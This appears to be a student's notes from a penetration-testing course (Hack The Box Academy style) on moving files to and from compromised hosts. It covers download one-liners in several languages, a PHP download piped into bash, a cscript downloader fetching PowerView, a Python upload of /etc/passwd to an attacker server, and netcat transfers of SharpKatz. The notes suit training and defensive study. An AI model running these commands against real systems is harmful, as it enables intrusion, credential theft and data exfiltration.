#### Python 2 - Download
```shell-session
KruKnight@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Python 3 - Download
```shell-session
KruKnight@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### PHP Download with File_get_contents()
```shell-session
KruKnight@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
#### PHP Download with Fopen()
```shell-session
KruKnight@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
#### PHP Download a File and Pipe it to Bash
```shell-session
KruKnight@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
#### Ruby - Download a File
```shell-session
KruKnight@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
#### Perl - Download a File
```shell-session
KruKnight@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript
- Create a file wget.js and save the bellow content

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
Then We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
#### Download a File Using JavaScript and cscript.exe
```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript
It is more like JavaScript, so refer to this post if needed. https://stackoverflow.com/questions/2973136/download-a-file-with-vbs
## Upload Operations using Python3
#### Starting the Python uploadserver Module
```shell-session
KruKnight@htb[/htb]$ python3 -m uploadserver 
```
#### Uploading a File Using a Python One-liner
```shell-session
KruKnight@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


# Miscellaneous File Transfer Methods
## File Transfer with Netcat and Ncat
#### NetCat - Compromised Machine - Listening on Port 8000
```shell-session
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.
#### Ncat - Compromised Machine - Listening on Port 8000'
```shell-session
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed
```shell-session
KruKnight@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
#### Ncat - Attack Host - Sending File to Compromised machine
```shell-session
KruKnight@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

*Instead of opening a port in compromized machine we can do the reverse, and listen in attack box*
#### Attack Host - Sending File as Input to Netcat
```shell-session
KruKnight@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File
```shell-session
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
Let's do the same with Ncat:
#### Attack Host - Sending File as Input to Ncat
```shell-session
KruKnight@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File
```shell-session
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
## PowerShell Session File Transfer
## RDP
1. We can use copy and paste to the targeted box from attack box.
As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.
#### Mounting a Linux Folder Using rdesktop
```shell-session
KruKnight@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
#### Mounting a Linux Folder Using xfreerdp
```shell-session
KruKnight@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
![[tsclient.jpg]]
Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
![[rdp.png]]
After selecting the drive, we can interact with it in the remote session that follows.
